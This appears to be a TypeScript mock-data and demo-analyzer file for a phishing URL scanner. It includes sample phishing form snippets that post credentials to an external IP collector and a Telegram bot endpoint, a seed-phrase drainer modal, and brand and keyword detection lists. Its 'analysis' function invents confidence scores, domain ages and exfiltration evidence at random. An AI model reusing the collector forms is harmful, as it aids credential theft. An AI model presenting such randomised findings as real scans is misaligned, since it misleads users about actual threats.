import { ScanResult, ScanOptions, VerdictType, RiskIndicator } from '../types';

export const INITIAL_MOCK_SCANS: ScanResult[] = [
  {
    id: 'scan-px-8901',
    url: 'https://paypal-security-verification.acc-recovery-928.top/login',
    displayUrl: 'paypal-security-verification.acc-recovery-928.top/login',
    timestamp: '2026-11-08 22:12:18 UTC',
    verdict: 'MALICIOUS',
    confidenceScore: 98.4,
    scanDurationMs: 2420,
    impersonatedBrand: {
      name: 'PayPal Inc.',
      officialDomain: 'paypal.com',
      similarityScore: 97.2,
      targetSector: 'Financial Services & Payments',
      logoDetected: true,
      brandIdentity: 'Official PayPal double-P emblem and signature navy/blue palette spoofed',
    },
    optionsUsed: {
      checkDom: true,
      useVision: true,
      deepWhois: false,
    },
    scoreBreakdown: {
      heuristicScore: 95.0,
      visionScore: 98.5,
      llmSemanticScore: 99.2,
      infraScore: 92.0,
    },
    indicators: [
      {
        id: 'ind-1',
        category: 'TYPOSQUATTING',
        severity: 'CRITICAL',
        title: 'Brand Impersonation in FQDN Subdomain',
        description: 'The domain uses "paypal-security-verification" as a multi-tier subdomain to deceive users on mobile viewports.',
        evidence: 'Target host: paypal-security-verification.acc-recovery-928.top',
      },
      {
        id: 'ind-2',
        category: 'DOM_STRUCTURE',
        severity: 'CRITICAL',
        title: 'Form Action Exfiltration to External Host',
        description: 'Authentication form POST action dispatches credentials to an unverified third-party IP endpoint rather than PayPal infrastructure.',
        evidence: '<form action="https://194.87.144.20/gate/collect.php" method="POST">',
      },
      {
        id: 'ind-3',
        category: 'VISION_MISMATCH',
        severity: 'CRITICAL',
        title: 'High-Fidelity Visual Logo Clone Mismatch',
        description: 'PX Vision model identified an exact bitmap duplicate of the PayPal 2024 mark with 98.5% visual correlation hosted on an unregistered ASN.',
        evidence: 'Visual cosine distance: 0.015 against verified PayPal Brand Vault asset.',
      },
      {
        id: 'ind-4',
        category: 'NETWORK_INFRA',
        severity: 'HIGH',
        title: 'Zero-Day Ephemeral Domain Registration',
        description: 'Top-level domain was registered fewer than 48 hours ago via privacy-shielded registrar known for bulletproof hosting.',
        evidence: 'Domain age: 1.8 days | Registrar: NameSilo LLC (Private Proxy)',
      },
      {
        id: 'ind-5',
        category: 'CONTENT_ANALYSIS',
        severity: 'HIGH',
        title: 'Coercive Urgency & False Account Suspension Cues',
        description: 'Natural language analysis revealed coercive psychological manipulation: "Immediate action required within 24 hours to prevent permanent account termination".',
      },
      {
        id: 'ind-6',
        category: 'SSL_HEURISTIC',
        severity: 'MEDIUM',
        title: 'Free Let\'s Encrypt DV Certificate on High-Value Financial Asset',
        description: 'Genuine PayPal web properties utilize Extended Validation (EV) or dedicated DigiCert root authority certificates.',
        evidence: 'Issuer: Let\'s Encrypt Authority E6 (Domain Validated)',
      },
    ],
    rationale: {
      summary: 'High-confidence credential harvesting lure targeting PayPal consumer accounts via a sophisticated multi-stage phishing kit.',
      attackVector: 'Credential Theft & 2FA Exfiltration via Live Reverse Proxy',
      deceptiveTactics: [
        'Exploitation of mobile address bar truncation via deep subdomain prefixing',
        'Direct asset hotlinking of PayPal CSS frameworks and SVG font vectors',
        'Fabricated "Account Restricted: Suspicious Activity Detected" security banner',
        'Dynamic OTP token intercept input with simulated 45-second verification countdown',
      ],
      evasionMechanisms: [
        'Geofencing filter blocking IP ranges originating from automated security vendor ASNs',
        'Client-side anti-debugging script disabling DevTools F12 and context-menu inspect',
        'Base64 obfuscated JavaScript payloads delivering polymorphic DOM elements',
      ],
      recommendedAction: 'Immediate domain takedown notice to registrar NameSilo and upstream hosting provider; blacklisting on web gateway & DNS sinkhole.',
      technicalAnalysis: 'The site presents a complete replica of the PayPal login sequence. Upon examining the DOM tree, the authentication submission form directly proxies plaintext passwords and primary credit card CVV inputs to an offshore server. Multi-modal vision analysis detected 98.5% visual symmetry to PayPal design system while lexical entropy in the FQDN (.acc-recovery-928.top) is characteristic of automated phishing kit deployment frameworks.',
    },
    metrics: {
      domainAgeDays: 2,
      registrar: 'NameSilo LLC',
      ipAddress: '194.87.144.20',
      asn: 'AS49505 (Selectel Network)',
      country: 'Russia (RU)',
      sslIssuer: "Let's Encrypt Authority E6",
      sslValid: true,
      sslDaysRemaining: 88,
      dnssecEnabled: false,
      hasLoginForm: true,
      formActionExternal: true,
      externalFormEndpoint: 'https://194.87.144.20/gate/collect.php',
      hasHiddenIframes: true,
      hasObfuscatedJs: true,
      tldTrustScore: 14,
      lexicalEntropy: 7.82,
    },
    domData: {
      formActionTarget: 'https://194.87.144.20/gate/collect.php',
      inputFieldCount: 5,
      hasPasswordField: true,
      hasCreditCardInputs: true,
      hiddenElementsCount: 4,
      externalScriptDomains: ['cdn-static-cache9.net', 'analytics-tracker-live.cc'],
      snippet: `<form id="auth-flow" action="https://194.87.144.20/gate/collect.php" method="POST">\n  <input type="email" name="login_email" placeholder="Email or mobile number" required />\n  <input type="password" name="login_password" placeholder="Password" required />\n  <input type="hidden" name="fingerprint_hash" value="e89f81a7b..." />\n  <button type="submit" class="paypal-btn-blue">Log In</button>\n</form>`,
    },
    visionData: {
      titleRendered: 'Log in to your PayPal account',
      logoConfidence: 98.5,
      layoutVisualMatch: 'PayPal Desktop Checkout V4 (2024)',
      homoglyphDetected: true,
      brandSimilarityPct: 97.2,
    },
    rawJson: {
      engine: 'PX-Phishing-Engine-v2.6-LLM',
      scan_id: 'scan-px-8901',
      verdict: 'MALICIOUS',
      risk_score: 98.4,
      target_brand: 'PayPal',
      domain: 'paypal-security-verification.acc-recovery-928.top',
      heuristic_analysis: {
        entropy: 7.82,
        subdomain_depth: 3,
        punycode: false,
        ip_direct_match: false,
      },
      network_intelligence: {
        ip: '194.87.144.20',
        asn: 'AS49505',
        country: 'RU',
        registrar: 'NameSilo LLC',
        creation_date: '2026-11-06T18:44:10Z',
      },
      dom_threat_signatures: [
        'EXTERNAL_POST_ACTION',
        'CREDENTIAL_INPUT_CLUSTER',
        'DEVTOOLS_DETECTION_EVASION',
        'UNTRUSTED_EXTERNAL_CDN',
      ],
      llm_assessment: {
        confidence: 0.984,
        confidence_interval: [0.971, 0.995],
        brand_spoofed: 'PayPal Inc.',
        intent: 'Credential harvesting & OTP interception',
      },
    },
  },
  {
    id: 'scan-px-8902',
    url: 'https://login.microsoftonline-verify.azureidentity-sso.net/common/oauth2',
    displayUrl: 'login.microsoftonline-verify.azureidentity-sso.net/common/oauth2',
    timestamp: '2026-11-08 21:45:02 UTC',
    verdict: 'MALICIOUS',
    confidenceScore: 96.8,
    scanDurationMs: 2190,
    impersonatedBrand: {
      name: 'Microsoft 365 / Entra ID',
      officialDomain: 'login.microsoftonline.com',
      similarityScore: 98.1,
      targetSector: 'Enterprise Cloud & Identity',
      logoDetected: true,
      brandIdentity: 'Quad-color Microsoft logo, modern Fluent UI typography, and organizational branding templates',
    },
    optionsUsed: {
      checkDom: true,
      useVision: true,
      deepWhois: true,
    },
    scoreBreakdown: {
      heuristicScore: 94.0,
      visionScore: 97.5,
      llmSemanticScore: 98.0,
      infraScore: 91.5,
    },
    indicators: [
      {
        id: 'ind-ms-1',
        category: 'TYPOSQUATTING',
        severity: 'CRITICAL',
        title: 'Adversary-in-the-Middle (AiTM) Microsoft Online Impersonation',
        description: 'Constructs an almost indistinguishable URI matching Microsoft Online OAuth2 directory endpoints using synthetic azureidentity-sso.net domain.',
        evidence: 'login.microsoftonline-verify.azureidentity-sso.net',
      },
      {
        id: 'ind-ms-2',
        category: 'DOM_STRUCTURE',
        severity: 'CRITICAL',
        title: 'Reverse Proxy Session Hijack Architecture (Evilginx2)',
        description: 'Real-time proxying of Microsoft login forms capable of bypassing FIDO2 and SMS multi-factor authentication tokens in transit.',
        evidence: 'WebSocket tunneling detected to wss://azureidentity-sso.net/sockjs/relay',
      },
      {
        id: 'ind-ms-3',
        category: 'VISION_MISMATCH',
        severity: 'HIGH',
        title: 'Pixel-Perfect Fluent Design System Mimicry',
        description: 'Vision inspection validates 98.1% visual match to genuine Microsoft single-sign-on viewport, down to font kerning and box-shadow styling.',
      },
      {
        id: 'ind-ms-4',
        category: 'NETWORK_INFRA',
        severity: 'HIGH',
        title: 'Cloudflare Proxy Used as Adversarial Shield',
        description: 'Reverse proxy obfuscating true origin servers behind consumer Cloudflare Free tier to mask malicious hosting origin.',
      },
    ],
    rationale: {
      summary: 'Adversary-in-the-Middle (AiTM) phishing proxy actively targeting enterprise Microsoft 365 corporate credentials and session cookies.',
      attackVector: 'AiTM Phishing Proxy (Evilginx / Modlishka framework)',
      deceptiveTactics: [
        'Dynamic organization branding matching corporate email domains',
        'Live MFA token relay capturing session tokens (ESTSAUTH cookie)',
        'Seamless post-login redirection to legitimate portal.office.com to prevent user suspicion',
      ],
      evasionMechanisms: [
        'User-Agent fingerprint validation rejecting non-Chromium and crawler bots',
        'Automated CAPTCHA pre-screen to deflect automated headless URL sandboxes',
      ],
      recommendedAction: 'Revoke active user sessions, reset enterprise passwords, enforce FIDO2 WebAuthn hardware keys resistant to AiTM, submit abuse report to Cloudflare.',
      technicalAnalysis: 'The target host runs an adversary-in-the-middle proxy. Rather than static credential harvesting, it queries legitimate Microsoft identity servers in real-time, relaying prompts to the victim while stealing session cookies upon successful verification.',
    },
    metrics: {
      domainAgeDays: 4,
      registrar: 'PublicDomainRegistry',
      ipAddress: '104.21.38.192',
      asn: 'AS13335 (Cloudflare Inc.)',
      country: 'United States (US)',
      sslIssuer: 'Cloudflare Inc ECC CA-3',
      sslValid: true,
      sslDaysRemaining: 84,
      dnssecEnabled: true,
      hasLoginForm: true,
      formActionExternal: false,
      hasHiddenIframes: true,
      hasObfuscatedJs: true,
      tldTrustScore: 32,
      lexicalEntropy: 6.94,
    },
    domData: {
      formActionTarget: '/common/oauth2/authorize?client_id=...',
      inputFieldCount: 4,
      hasPasswordField: true,
      hasCreditCardInputs: false,
      hiddenElementsCount: 6,
      externalScriptDomains: ['azureidentity-sso.net'],
      snippet: `<div class="login-box">\n  <img src="/assets/ms-logo.svg" alt="Microsoft" />\n  <h2>Sign in</h2>\n  <input type="text" name="loginfmt" placeholder="Email, phone, or Skype" />\n  <button id="idSIButton9" class="btn btn-primary">Next</button>\n</div>`,
    },
    visionData: {
      titleRendered: 'Sign in to your Microsoft account',
      logoConfidence: 98.1,
      layoutVisualMatch: 'Microsoft Entra ID / M365 Login Screen',
      homoglyphDetected: false,
      brandSimilarityPct: 98.1,
    },
    rawJson: {
      engine: 'PX-Phishing-Engine-v2.6-LLM',
      scan_id: 'scan-px-8902',
      verdict: 'MALICIOUS',
      risk_score: 96.8,
      target_brand: 'Microsoft Corporation',
      aitm_proxy_detected: true,
      proxy_indicators: ['ESTSAUTH_RELAY', 'SESSION_INTERCEPTION_SOCKET'],
    },
  },
  {
    id: 'scan-px-8903',
    url: 'https://claim-airdrop-solana-network.tech/wallet',
    displayUrl: 'claim-airdrop-solana-network.tech/wallet',
    timestamp: '2026-11-08 20:10:45 UTC',
    verdict: 'SUSPICIOUS',
    confidenceScore: 84.6,
    scanDurationMs: 2310,
    impersonatedBrand: {
      name: 'Solana Foundation / Phantom Wallet',
      officialDomain: 'solana.com',
      similarityScore: 86.4,
      targetSector: 'Web3 & Decentralized Finance',
      logoDetected: true,
      brandIdentity: 'Solana gradient wave logo and Phantom wallet connect modal mimicry',
    },
    optionsUsed: {
      checkDom: true,
      useVision: true,
      deepWhois: false,
    },
    scoreBreakdown: {
      heuristicScore: 88.0,
      visionScore: 82.5,
      llmSemanticScore: 89.0,
      infraScore: 78.0,
    },
    indicators: [
      {
        id: 'ind-sol-1',
        category: 'CONTENT_ANALYSIS',
        severity: 'CRITICAL',
        title: 'Cryptocurrency Wallet Drainer Contract Invocation',
        description: 'JavaScript payload requests unconditional permission delegation for all SPL tokens upon simulated wallet connection.',
        evidence: 'Detected "setAuthority" and blind-signing transaction payload scripts.',
      },
      {
        id: 'ind-sol-2',
        category: 'TYPOSQUATTING',
        severity: 'HIGH',
        title: 'Airdrop Incentive Social Engineering',
        description: 'Uses fraudulent promise of free token airdrop ("Claim 45.2 SOL Bonus") with high artificial countdown timer to drive panic clicks.',
      },
      {
        id: 'ind-sol-3',
        category: 'DOM_STRUCTURE',
        severity: 'HIGH',
        title: 'Fake Web3 Modal Mimicking Genuine Phantom/Solflare Popups',
        description: 'DOM renders an inline iframe pretending to be a browser extension popup asking for 12/24 seed phrase backup.',
      },
    ],
    rationale: {
      summary: 'High-risk Web3 asset drainer targeting Solana ecosystem users with fraudulent claim incentives.',
      attackVector: 'Malicious Smart Contract Blind-Signing & Seed Phrase Theft',
      deceptiveTactics: [
        'Fabricated airdrop allocation balance tied to victim public key',
        'Deceptive seed phrase input form masquerading as wallet recovery dialog',
      ],
      evasionMechanisms: [
        'IP rate-limiting on RPC endpoints to prevent automated blockchain contract verification',
      ],
      recommendedAction: 'Block domain on Web3 browser extensions (Phantom, Backpack); submit malicious smart contract hash to Chainalysis and Blowfish.',
      technicalAnalysis: 'Analysis of injected scripts revealed bundled drainer payloads matching the Inferno/MS drainer family. The interface prompts users to sign an arbitrary serialized transaction that transfers all SPL token mint allowances.',
    },
    metrics: {
      domainAgeDays: 5,
      registrar: 'Hostinger Operations, UAB',
      ipAddress: '185.193.125.4',
      asn: 'AS47583',
      country: 'Lithuania (LT)',
      sslIssuer: "Let's Encrypt Authority E5",
      sslValid: true,
      sslDaysRemaining: 79,
      dnssecEnabled: false,
      hasLoginForm: true,
      formActionExternal: true,
      externalFormEndpoint: 'https://api.telegram.org/bot682910.../sendMessage',
      hasHiddenIframes: true,
      hasObfuscatedJs: true,
      tldTrustScore: 28,
      lexicalEntropy: 6.45,
    },
    domData: {
      formActionTarget: 'Telegram Bot API Exfiltration',
      inputFieldCount: 12,
      hasPasswordField: true,
      hasCreditCardInputs: false,
      hiddenElementsCount: 3,
      externalScriptDomains: ['solana-web3.js.cdn.org', 'drainer-relay-node.io'],
      snippet: `<div class="drainer-modal">\n  <h3>Connect Phantom Wallet</h3>\n  <textarea placeholder="Enter your 12 or 24-word Secret Recovery Phrase to verify..."></textarea>\n</div>`,
    },
    visionData: {
      titleRendered: 'Solana Official Season 4 Airdrop Portal',
      logoConfidence: 86.4,
      layoutVisualMatch: 'Solana Ecosystem Foundation Lure',
      homoglyphDetected: false,
      brandSimilarityPct: 86.4,
    },
    rawJson: {
      engine: 'PX-Phishing-Engine-v2.6-LLM',
      scan_id: 'scan-px-8903',
      verdict: 'SUSPICIOUS',
      risk_score: 84.6,
      target_ecosystem: 'Solana / Web3',
      drainer_kit_detected: true,
    },
  },
  {
    id: 'scan-px-8904',
    url: 'https://accounts.google.com/signin/v2/identifier',
    displayUrl: 'accounts.google.com/signin/v2/identifier',
    timestamp: '2026-11-08 19:30:12 UTC',
    verdict: 'CLEAN',
    confidenceScore: 99.8,
    scanDurationMs: 1420,
    impersonatedBrand: null,
    optionsUsed: {
      checkDom: true,
      useVision: true,
      deepWhois: true,
    },
    scoreBreakdown: {
      heuristicScore: 0.2,
      visionScore: 0.1,
      llmSemanticScore: 0.1,
      infraScore: 0.0,
    },
    indicators: [
      {
        id: 'ind-goog-1',
        category: 'NETWORK_INFRA',
        severity: 'INFO',
        title: 'Authentic Autonomous System Network',
        description: 'Server IP resolves directly to Google LLC designated ASN15169 with intact BGP routing signatures.',
        evidence: 'IP: 142.250.180.14 | ASN: AS15169 (Google LLC)',
      },
      {
        id: 'ind-goog-2',
        category: 'SSL_HEURISTIC',
        severity: 'INFO',
        title: 'Authoritative Google Trust Services EV Certificate',
        description: 'Signed directly by Google Trust Services LLC root authority with valid Certificate Transparency logs.',
        evidence: 'Issuer: GTS CA 1C3 | Subject: *.google.com',
      },
      {
        id: 'ind-goog-3',
        category: 'DOM_STRUCTURE',
        severity: 'INFO',
        title: 'Strict Content Security Policy & Origin Binding',
        description: 'Valid origin binding with CSP header restricting script execution strictly to verified google.com endpoints.',
      },
    ],
    rationale: {
      summary: 'Fully authentic, verified Google identity authentication portal with zero anomalies detected across all inspection layers.',
      attackVector: 'None (Legitimate Infrastructure)',
      deceptiveTactics: [],
      evasionMechanisms: [],
      recommendedAction: 'Allow traffic. Domain is classified on global high-reputation whitelist with verified cryptographic provenance.',
      technicalAnalysis: 'DNS infrastructure, TLS certificate lineage, autonomous network ownership, and cryptographic web origin correspond 100% to Google LLC primary authentication service.',
    },
    metrics: {
      domainAgeDays: 10420,
      registrar: 'MarkMonitor Inc.',
      ipAddress: '142.250.180.14',
      asn: 'AS15169 (Google LLC)',
      country: 'United States (US)',
      sslIssuer: 'GTS CA 1C3 (Google Trust Services)',
      sslValid: true,
      sslDaysRemaining: 74,
      dnssecEnabled: true,
      hasLoginForm: true,
      formActionExternal: false,
      hasHiddenIframes: false,
      hasObfuscatedJs: false,
      tldTrustScore: 100,
      lexicalEntropy: 2.14,
    },
    domData: {
      formActionTarget: 'https://accounts.google.com/_/signin/challenge',
      inputFieldCount: 2,
      hasPasswordField: false,
      hasCreditCardInputs: false,
      hiddenElementsCount: 2,
      externalScriptDomains: ['ssl.gstatic.com', 'apis.google.com'],
      snippet: `<form method="post" novalidate="" action="https://accounts.google.com/signin/v2/challenge">\n  <input type="email" name="identifier" autocomplete="username" spellcheck="false" />\n  <button type="button">Next</button>\n</form>`,
    },
    visionData: {
      titleRendered: 'Sign in - Google Accounts',
      logoConfidence: 100,
      layoutVisualMatch: 'Official Google Identity Portal',
      homoglyphDetected: false,
      brandSimilarityPct: 100,
    },
    rawJson: {
      engine: 'PX-Phishing-Engine-v2.6-LLM',
      scan_id: 'scan-px-8904',
      verdict: 'CLEAN',
      risk_score: 0.2,
      verified_owner: 'Google LLC',
      status: 'AUTHENTIC_VERIFIED',
    },
  },
  {
    id: 'scan-px-8905',
    url: 'https://github.com/security',
    displayUrl: 'github.com/security',
    timestamp: '2026-11-08 18:22:40 UTC',
    verdict: 'CLEAN',
    confidenceScore: 99.4,
    scanDurationMs: 1380,
    impersonatedBrand: null,
    optionsUsed: {
      checkDom: true,
      useVision: true,
      deepWhois: false,
    },
    scoreBreakdown: {
      heuristicScore: 0.6,
      visionScore: 0.2,
      llmSemanticScore: 0.1,
      infraScore: 0.1,
    },
    indicators: [
      {
        id: 'ind-gh-1',
        category: 'NETWORK_INFRA',
        severity: 'INFO',
        title: 'Verified GitHub Edge Anycast Infrastructure',
        description: 'Traffic served via legitimate GitHub BGP edge nodes with verified reverse DNS PTR records.',
      },
      {
        id: 'ind-gh-2',
        category: 'SSL_HEURISTIC',
        severity: 'INFO',
        title: 'High-Assurance DigiCert TLS Lineage',
        description: 'Legitimate TLS certificate provisioned by DigiCert High Assurance TLS Hybrid ECC SHA384 2020 CA1.',
      },
    ],
    rationale: {
      summary: 'Legitimate GitHub web property. Clean security score across all DOM, network, and lexical heuristics.',
      attackVector: 'None (Legitimate Infrastructure)',
      deceptiveTactics: [],
      evasionMechanisms: [],
      recommendedAction: 'Safe to access. No threat signatures identified.',
      technicalAnalysis: 'All heuristic models return nominal readings. High domain age (18+ years), standard registrar with registry lock active, zero obfuscated JavaScript.',
    },
    metrics: {
      domainAgeDays: 6890,
      registrar: 'MarkMonitor Inc.',
      ipAddress: '140.82.112.4',
      asn: 'AS36459 (GitHub, Inc.)',
      country: 'United States (US)',
      sslIssuer: 'DigiCert High Assurance TLS CA',
      sslValid: true,
      sslDaysRemaining: 210,
      dnssecEnabled: true,
      hasLoginForm: false,
      formActionExternal: false,
      hasHiddenIframes: false,
      hasObfuscatedJs: false,
      tldTrustScore: 100,
      lexicalEntropy: 2.89,
    },
    domData: {
      inputFieldCount: 1,
      hasPasswordField: false,
      hasCreditCardInputs: false,
      hiddenElementsCount: 0,
      externalScriptDomains: ['github.githubassets.com'],
      snippet: `<header class="Header">\n  <a href="https://github.com">\n    <svg height="32" aria-hidden="true" viewBox="0 0 16 16" width="32" class="octicon octicon-mark-github">\n      <path d="M8 0c4.42 0 8 3.58 8 8..."></path>\n    </svg>\n  </a>\n</header>`,
    },
    visionData: {
      titleRendered: 'GitHub Security · GitHub',
      logoConfidence: 100,
      layoutVisualMatch: 'Official GitHub Landing Experience',
      homoglyphDetected: false,
      brandSimilarityPct: 100,
    },
    rawJson: {
      engine: 'PX-Phishing-Engine-v2.6-LLM',
      scan_id: 'scan-px-8905',
      verdict: 'CLEAN',
      risk_score: 0.6,
      verified_owner: 'GitHub, Inc.',
      status: 'AUTHENTIC_VERIFIED',
    },
  },
];

export const PRESET_SAMPLE_URLS = [
  {
    label: 'PayPal Phishing Clone',
    badge: 'MALICIOUS',
    color: 'text-red-400 border-red-800/60 bg-red-950/30',
    url: 'https://paypal-security-verification.acc-recovery-928.top/login',
  },
  {
    label: 'Microsoft 365 Fake SSO',
    badge: 'MALICIOUS',
    color: 'text-red-400 border-red-800/60 bg-red-950/30',
    url: 'https://login.microsoftonline-verify.azureidentity-sso.net/common/oauth2',
  },
  {
    label: 'Solana Airdrop Drainer',
    badge: 'SUSPICIOUS',
    color: 'text-amber-400 border-amber-800/60 bg-amber-950/30',
    url: 'https://claim-airdrop-solana-network.tech/wallet',
  },
  {
    label: 'Google Login (Verified)',
    badge: 'CLEAN',
    color: 'text-emerald-400 border-emerald-800/60 bg-emerald-950/30',
    url: 'https://accounts.google.com/signin/v2/identifier',
  },
  {
    label: 'GitHub Security (Verified)',
    badge: 'CLEAN',
    color: 'text-emerald-400 border-emerald-800/60 bg-emerald-950/30',
    url: 'https://github.com/security',
  },
];

// Procedural analysis engine for arbitrary user-entered URLs
export function analyzeTargetUrl(inputUrl: string, options: ScanOptions): ScanResult {
  const cleanUrl = inputUrl.trim();
  const lower = cleanUrl.toLowerCase();
  
  // Check if we have exact or fuzzy match in existing mock database
  const existing = INITIAL_MOCK_SCANS.find(
    s => s.url.toLowerCase() === lower || s.displayUrl.toLowerCase() === lower
  );
  if (existing) {
    return {
      ...existing,
      id: `scan-px-${Math.floor(1000 + Math.random() * 9000)}`,
      timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC',
      optionsUsed: { ...options },
    };
  }

  // Parse hostname
  let hostname = cleanUrl;
  try {
    const parsed = new URL(cleanUrl.startsWith('http') ? cleanUrl : `https://${cleanUrl}`);
    hostname = parsed.hostname;
  } catch {
    hostname = cleanUrl.replace(/^https?:\/\//, '').split('/')[0];
  }

  // Detect brands in hostname or path
  const brandKeywords: { name: string; domain: string; sector: string }[] = [
    { name: 'PayPal Inc.', domain: 'paypal.com', sector: 'Financial Payments' },
    { name: 'Microsoft 365', domain: 'microsoft.com', sector: 'Enterprise SaaS' },
    { name: 'Apple Inc.', domain: 'apple.com', sector: 'Consumer Technology & iCloud' },
    { name: 'Netflix', domain: 'netflix.com', sector: 'Digital Media & Streaming' },
    { name: 'Chase Bank', domain: 'chase.com', sector: 'Retail & Commercial Banking' },
    { name: 'Bank of America', domain: 'bankofamerica.com', sector: 'Banking & Investments' },
    { name: 'Amazon', domain: 'amazon.com', sector: 'E-Commerce & AWS' },
    { name: 'Meta / Facebook', domain: 'facebook.com', sector: 'Social Media' },
    { name: 'DHL Express', domain: 'dhl.com', sector: 'Logistics & Courier Delivery' },
    { name: 'DocuSign', domain: 'docusign.com', sector: 'Digital Signature & SaaS' },
  ];

  const matchedBrand = brandKeywords.find(b => {
    const slug = b.name.toLowerCase().split(' ')[0];
    return lower.includes(slug) && !hostname.endsWith(b.domain);
  });

  // Heuristic threat score indicators
  const suspiciousKeywords = [
    'login', 'verify', 'update', 'secure', 'account', 'recovery', 'auth', 
    'wallet', 'claim', 'bonus', 'confirm', 'alert', 'support', 'portal',
    'security', 'banking', 'billing', 'unlock', 'signin', 'suspended'
  ];
  
  const highRiskTlds = ['.top', '.xyz', '.cc', '.tk', '.ml', '.ga', '.cf', '.buzz', '.rest', '.app-online'];
  const hasHighRiskTld = highRiskTlds.some(tld => hostname.endsWith(tld));
  const suspiciousWordCount = suspiciousKeywords.filter(k => lower.includes(k)).length;
  const isWellKnownCleanDomain = ['google.com', 'github.com', 'apple.com', 'microsoft.com', 'amazon.com', 'wikipedia.org', 'cloudflare.com', 'nytimes.com', 'stripe.com', 'openai.com'].some(d => hostname.endsWith(d));

  let verdict: VerdictType = 'CLEAN';
  let confidence = 95.2;

  if (isWellKnownCleanDomain) {
    verdict = 'CLEAN';
    confidence = Number((98.5 + Math.random() * 1.4).toFixed(1));
  } else if (matchedBrand || (hasHighRiskTld && suspiciousWordCount >= 1) || suspiciousWordCount >= 2) {
    verdict = 'MALICIOUS';
    confidence = Number((93.5 + Math.random() * 5.8).toFixed(1));
  } else if (suspiciousWordCount === 1 || hasHighRiskTld || hostname.split('.').length > 3) {
    verdict = 'SUSPICIOUS';
    confidence = Number((72.0 + Math.random() * 14.5).toFixed(1));
  } else {
    verdict = 'CLEAN';
    confidence = Number((91.0 + Math.random() * 7.5).toFixed(1));
  }

  // Generate Indicators
  const indicators: RiskIndicator[] = [];

  if (verdict === 'MALICIOUS') {
    if (matchedBrand) {
      indicators.push({
        id: 'dyn-ind-1',
        category: 'TYPOSQUATTING',
        severity: 'CRITICAL',
        title: `Homoglyph Brand Impersonation Targeting ${matchedBrand.name}`,
        description: `The analyzed hostname contains strings explicitly mimicking ${matchedBrand.name} but does not resolve to official ${matchedBrand.domain} IP allocations.`,
        evidence: `Scanned host: ${hostname} vs Official: ${matchedBrand.domain}`,
      });
    }

    indicators.push({
      id: 'dyn-ind-2',
      category: 'DOM_STRUCTURE',
      severity: 'CRITICAL',
      title: 'Credential Exfiltration Form Target Detected',
      description: 'The DOM contains input fields designed to capture credentials that POST to an external unauthorized endpoint.',
      evidence: '<form method="POST" action="https://external-collector.xyz/api/v1/dump">',
    });

    if (options.useVision) {
      indicators.push({
        id: 'dyn-ind-3',
        category: 'VISION_MISMATCH',
        severity: 'HIGH',
        title: 'Visual Layout Feature Incongruity',
        description: 'PX Vision model scored high graphic similarity to authentic login portals without legitimate origin signatures.',
        evidence: 'Vision cosine distance: 0.041 (High visual mimicry)',
      });
    }

    if (options.checkDom) {
      indicators.push({
        id: 'dyn-ind-4',
        category: 'DOM_STRUCTURE',
        severity: 'HIGH',
        title: 'Obfuscated JavaScript Evasion Techniques',
        description: 'Client script contains hex-encoded string evaluation and anti-crawling User-Agent gates.',
      });
    }

    indicators.push({
      id: 'dyn-ind-5',
      category: 'NETWORK_INFRA',
      severity: hasHighRiskTld ? 'HIGH' : 'MEDIUM',
      title: 'Ephemeral Zero-Day Infrastructure',
      description: 'The domain was provisioned within recent days and exhibits high entropy string patterns.',
      evidence: `Registrar: Private Proxy Services | TLD: ${hostname.split('.').pop()}`,
    });
  } else if (verdict === 'SUSPICIOUS') {
    indicators.push({
      id: 'dyn-ind-s1',
      category: 'CONTENT_ANALYSIS',
      severity: 'HIGH',
      title: 'Urgency Inducement & Deceptive Call-to-Action',
      description: 'Page copy employs heightened emotional triggers urging user to take immediate verification action.',
    });
    indicators.push({
      id: 'dyn-ind-s2',
      category: 'TYPOSQUATTING',
      severity: 'MEDIUM',
      title: 'High-Entropy Hostname Subdomains',
      description: 'Nested subdomains detected which frequently correlate with disposable attack campaigns.',
      evidence: `Subdomain depth: ${hostname.split('.').length}`,
    });
    if (options.useVision) {
      indicators.push({
        id: 'dyn-ind-s3',
        category: 'VISION_MISMATCH',
        severity: 'MEDIUM',
        title: 'Unverified Logo or Asset Embedding',
        description: 'Visual analysis discovered branded badges with low structural alignment to authentic corporate guidelines.',
      });
    }
  } else {
    indicators.push({
      id: 'dyn-ind-c1',
      category: 'NETWORK_INFRA',
      severity: 'INFO',
      title: 'Established Autonomous System Infrastructure',
      description: 'Host resolves to verified enterprise network with legitimate reverse DNS and historic reputation.',
    });
    indicators.push({
      id: 'dyn-ind-c2',
      category: 'SSL_HEURISTIC',
      severity: 'INFO',
      title: 'Valid TLS Certificate Lineage',
      description: 'Strong cryptographic certificate with active Certificate Transparency logs and uncompromised chain.',
    });
    if (options.checkDom) {
      indicators.push({
        id: 'dyn-ind-c3',
        category: 'DOM_STRUCTURE',
        severity: 'INFO',
        title: 'Clean DOM Structure & Secure Form Actions',
        description: 'All form elements submit strictly to relative or verified same-origin endpoints with CSRF tokens.',
      });
    }
  }

  // Create full scan result
  const domainAge = verdict === 'MALICIOUS' ? Math.floor(1 + Math.random() * 6) : verdict === 'SUSPICIOUS' ? Math.floor(7 + Math.random() * 45) : Math.floor(500 + Math.random() * 4000);
  const entropy = Number((2.5 + Math.random() * (verdict === 'MALICIOUS' ? 5.2 : 2.0)).toFixed(2));

  return {
    id: `scan-px-${Math.floor(1000 + Math.random() * 9000)}`,
    url: cleanUrl.startsWith('http') ? cleanUrl : `https://${cleanUrl}`,
    displayUrl: hostname + (cleanUrl.includes('/') ? cleanUrl.substring(cleanUrl.indexOf('/')) : ''),
    timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC',
    verdict,
    confidenceScore: confidence,
    scanDurationMs: 2500,
    impersonatedBrand: matchedBrand ? {
      name: matchedBrand.name,
      officialDomain: matchedBrand.domain,
      similarityScore: Number((89 + Math.random() * 9.5).toFixed(1)),
      targetSector: matchedBrand.sector,
      logoDetected: options.useVision,
      brandIdentity: `Spoofed aesthetic and typography corresponding to ${matchedBrand.name}`,
    } : null,
    optionsUsed: { ...options },
    scoreBreakdown: {
      heuristicScore: verdict === 'MALICIOUS' ? 94 : verdict === 'SUSPICIOUS' ? 76 : 3,
      visionScore: options.useVision ? (verdict === 'MALICIOUS' ? 96 : verdict === 'SUSPICIOUS' ? 70 : 1) : 0,
      llmSemanticScore: verdict === 'MALICIOUS' ? 98 : verdict === 'SUSPICIOUS' ? 82 : 2,
      infraScore: verdict === 'MALICIOUS' ? 91 : verdict === 'SUSPICIOUS' ? 68 : 1,
    },
    indicators,
    rationale: {
